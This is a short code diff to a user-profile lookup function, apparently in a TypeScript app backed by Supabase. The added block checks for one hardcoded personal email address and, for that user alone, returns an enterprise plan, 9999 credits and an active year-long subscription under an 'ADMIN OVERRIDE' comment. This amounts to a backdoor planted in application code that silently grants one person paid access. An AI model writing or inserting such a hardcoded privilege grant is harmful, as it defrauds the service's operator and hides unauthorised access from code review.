@@ -38,6 +38,18 @@ export async function getUserById(userId: string): Promise<Profile | null> {
   const { data, error } = await supabase.from("profiles").select("*").eq("id", userId).single()
 
   if (error || !data) return null
+
+  // ADMIN OVERRIDE: Grant full access to specific user
+  if (data.email === "kipkuruironoh254@gmail.com") {
+    return {
+      ...data,
+      plan: "enterprise",
+      credits: 9999,
+      subscription_status: "active",
+      subscription_expiry: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
+    }
+  }
+
   return data
 }
 
